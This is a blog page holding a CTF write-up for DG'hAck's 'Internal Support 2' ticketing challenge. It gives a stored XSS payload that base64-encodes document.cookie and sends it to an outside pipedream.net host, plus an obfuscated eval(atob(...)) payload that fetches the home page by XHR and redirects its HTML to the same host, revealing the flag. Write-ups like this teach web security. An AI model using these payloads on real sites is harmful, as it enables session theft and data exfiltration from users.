@@ -1,0 +1,60 @@
+<!doctype html><html lang=en-us><head><link rel=preconnect href=https://fonts.gstatic.com/ crossorigin><link rel=stylesheet href=/css/main.min.3c9fa6b3264a9f8be4f27730f1d5f0ded496304d03812ed49d97703ffb28122a.css integrity="sha256-PJ+msyZKn4vk8ncw8dXw3tSWME0DgS7UnZdwP/soEio=" crossorigin=anonymous media=screen><link rel=stylesheet href="https://fonts.googleapis.com/css?family=Didact+Gothic"><meta charset=utf-8><meta http-equiv=x-ua-compatible content="chrome=1"><meta name=HandheldFriendly content="True"><meta name=MobileOptimized content="320"><meta name=viewport content="width=device-width,initial-scale=1"><meta name=referrer content="no-referrer"><title>Writeup DG&rsquo;hAck: Internal Support 2 - Nicolas Bourras</title><meta name=twitter:card content="summary"><meta name=twitter:title content="Writeup DG'hAck: Internal Support 2"><meta name=twitter:description content="This is the second version of the ticketing system presented in the CTF. We are greeted with the exact same interface. So let&rsquo;s try exactly the same payload:
+<svg onload=&#34;document.body.innerHTML=document.body.innerHTML.concat('<img src=\'https://enx8b5ofkwzw.x.pipedream.net/'.concat(btoa(document.cookie)).concat('\' />'))&#34; /> After a few seconds, we manage to steal a cookie! However, we can&rsquo;t use it, as the session is ip-locked:
+
+Hmm. The challenge is quite similar to the last one, so we know that the flag is probably on the home page."><meta property="og:title" content="Writeup DG'hAck: Internal Support 2"><meta property="og:description" content="This is the second version of the ticketing system presented in the CTF. We are greeted with the exact same interface. So let&rsquo;s try exactly the same payload:
+<svg onload=&#34;document.body.innerHTML=document.body.innerHTML.concat('<img src=\'https://enx8b5ofkwzw.x.pipedream.net/'.concat(btoa(document.cookie)).concat('\' />'))&#34; /> After a few seconds, we manage to steal a cookie! However, we can&rsquo;t use it, as the session is ip-locked:
+
+Hmm. The challenge is quite similar to the last one, so we know that the flag is probably on the home page."><meta property="og:type" content="article"><meta property="og:url" content="https://nicolasb.fr/blog/writeup-dghack-internal-support-2/"><meta property="article:published_time" content="2020-11-19T03:45:38+01:00"><meta property="article:modified_time" content="2020-11-19T03:45:38+01:00"><title>Writeup DG&rsquo;hAck: Internal Support 2</title></head><body><header class="wrap flex-container"><h1>Writeup DG&rsquo;hAck: Internal Support 2</h1></header><main class=wrap><div class=flex-container><aside role=complementary>Nov 19, 2020 &#183; 251 words<div class=tag-container><span class=tag><a href=/tags/blog/>blog</a></span>
+<span class=tag><a href=/tags/security/>security</a></span>
+<span class=tag><a href=/tags/ctf/>ctf</a></span>
+<span class=tag><a href=/tags/dghack/>dghack</a></span></div></aside><hr><article role=article><p>This is the second version of the <a href=/blog/writeup-dghack-internal-support-1>ticketing system</a> presented in the CTF. We are greeted with the exact same interface. So let&rsquo;s try exactly the same payload:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html>&lt;<span style=color:#f92672>svg</span> <span style=color:#a6e22e>onload</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;document.body.innerHTML=document.body.innerHTML.concat(&#39;&lt;img src=\&#39;https://enx8b5ofkwzw.x.pipedream.net/&#39;.concat(btoa(document.cookie)).concat(&#39;\&#39; /&gt;&#39;))&#34;</span> /&gt;
+</code></pre></div><p>After a few seconds, we manage to steal a cookie! However, we can&rsquo;t use it, as the session is ip-locked:</p><p><a href=/assets/dghack/internal-support-2-ip-denied.png><img src=/assets/dghack/internal-support-2-ip-denied.png alt="The IP-lock error message"></a></p><p>Hmm. The challenge is quite similar to the last one, so we know that the flag is probably on the home page. Let&rsquo;s try reading it using some XHR!</p><p>The JS we&rsquo;ll inject is going to be:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=color:#66d9ef>var</span> <span style=color:#a6e22e>request</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>XMLHttpRequest</span>();
+<span style=color:#a6e22e>request</span>.<span style=color:#a6e22e>onreadystatechange</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>function</span> () {
+    <span style=color:#66d9ef>var</span> <span style=color:#a6e22e>DONE</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>DONE</span> <span style=color:#f92672>||</span> <span style=color:#ae81ff>4</span>;
+    <span style=color:#66d9ef>if</span> (<span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>readyState</span> <span style=color:#f92672>===</span> <span style=color:#a6e22e>DONE</span>){
+        <span style=color:#66d9ef>var</span> <span style=color:#a6e22e>encoded</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>btoa</span>(<span style=color:#a6e22e>request</span>.<span style=color:#a6e22e>responseText</span>);
+        document.<span style=color:#a6e22e>location</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;https://enx8b5ofkwzw.x.pipedream.net?&#39;</span> <span style=color:#f92672>+</span> <span style=color:#a6e22e>encoded</span>;
+    }
+};
+<span style=color:#a6e22e>request</span>.<span style=color:#a6e22e>open</span>(<span style=color:#e6db74>&#39;GET&#39;</span>, <span style=color:#e6db74>&#39;/&#39;</span>, <span style=color:#66d9ef>true</span>);
+<span style=color:#a6e22e>request</span>.<span style=color:#a6e22e>send</span>(<span style=color:#66d9ef>null</span>);
+</code></pre></div><p>NOTE : we can&rsquo;t use the <code>fetch</code> api, the bot must not be that up to date.</p><p>Which translates to this payload:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html>&lt;<span style=color:#f92672>svg</span> <span style=color:#a6e22e>onload</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;eval(atob(&#39;dmFyIHJlcXVlc3QgPSBuZXcgWE1MSHR0cFJlcXVlc3QoKTsKcmVxdWVzdC5vbnJlYWR5c3RhdGVjaGFuZ2UgPSBmdW5jdGlvbiAoKSB7CiAgICB2YXIgRE9ORSA9IHRoaXMuRE9ORSB8fCA0OwogICAgaWYgKHRoaXMucmVhZHlTdGF0ZSA9PT0gRE9ORSl7CiAgICAgICAgdmFyIGVuY29kZWQgPSBidG9hKHJlcXVlc3QucmVzcG9uc2VUZXh0KTsKICAgICAgICBkb2N1bWVudC5sb2NhdGlvbiA9ICdodHRwczovL2VueDhiNW9ma3d6dy54LnBpcGVkcmVhbS5uZXQ/JyArIGVuY29kZWQ7CiAgICB9Cn07CnJlcXVlc3Qub3BlbignR0VUJywgJy8nLCB0cnVlKTsKcmVxdWVzdC5zZW5kKG51bGwpOw==&#39;))&#34;</span> /&gt;
+</code></pre></div><p>And there we go, after a few seconds, we get our html. In it, we find the todo-list :</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html>&lt;<span style=color:#f92672>section</span> <span style=color:#a6e22e>style</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;margin-top: 50px;&#34;</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;pt-95 pb-100&#34;</span>&gt;
+  &lt;<span style=color:#f92672>div</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;container&#34;</span>&gt;
+    &lt;<span style=color:#f92672>div</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;row justify-content-center&#34;</span>&gt;
+      &lt;<span style=color:#f92672>div</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;col-lg-8&#34;</span>&gt;
+        &lt;<span style=color:#f92672>div</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;section-title pb-20&#34;</span>&gt;
+          &lt;<span style=color:#f92672>h4</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;title&#34;</span>&gt;TODOLIST&lt;/<span style=color:#f92672>h4</span>&gt;
+        &lt;/<span style=color:#f92672>div</span>&gt;
+      &lt;/<span style=color:#f92672>div</span>&gt;
+    &lt;/<span style=color:#f92672>div</span>&gt;
+    &lt;<span style=color:#f92672>div</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;row justify-content-center&#34;</span>&gt;
+      &lt;<span style=color:#f92672>div</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;col-lg-8&#34;</span>&gt;
+        &lt;<span style=color:#f92672>div</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;section-title pb-20&#34;</span>&gt;
+
+          &lt;<span style=color:#f92672>p</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;text&#34;</span>&gt;
+            - Fix the kernel panic problem on the servers
+          &lt;/<span style=color:#f92672>p</span>&gt;
+
+          &lt;<span style=color:#f92672>p</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;text&#34;</span>&gt;
+            - Find a solution for the XSS on the helpdesk system
+          &lt;/<span style=color:#f92672>p</span>&gt;
+
+          &lt;<span style=color:#f92672>p</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;text&#34;</span>&gt;
+            - Hide the flag &amp;#34;BEtter_BUT_ST!LL_N0tttttttttt++Prfct!&amp;#34; a little bit better
+          &lt;/<span style=color:#f92672>p</span>&gt;
+
+        &lt;/<span style=color:#f92672>div</span>&gt;
+      &lt;/<span style=color:#f92672>div</span>&gt;
+    &lt;/<span style=color:#f92672>div</span>&gt;
+  &lt;/<span style=color:#f92672>div</span>&gt;
+&lt;/<span style=color:#f92672>section</span>&gt;
+</code></pre></div><p>Which contains the flag: <code>BEtter_BUT_ST!LL_N0tttttttttt++Prfct!</code>.</p><hr><p><a href=/tags/dghack>View all of the DG&rsquo;hAck articles</a>.</p></article></div><nav role=navigation class="flex-container bottom-menu"><hr><p><a href=/blog>back</a>
+&#183;
+<a href=/blog>blog</a>
+&#183;
+<a href=/recipes>recipes</a>
+&#183;
+<a href=/about>who am I?</a>
+&#183;
+<a href=/>home</a></p></nav></main><footer class="flex-container footer">Nicolas Bourras&rsquo;s site</footer></body></html>
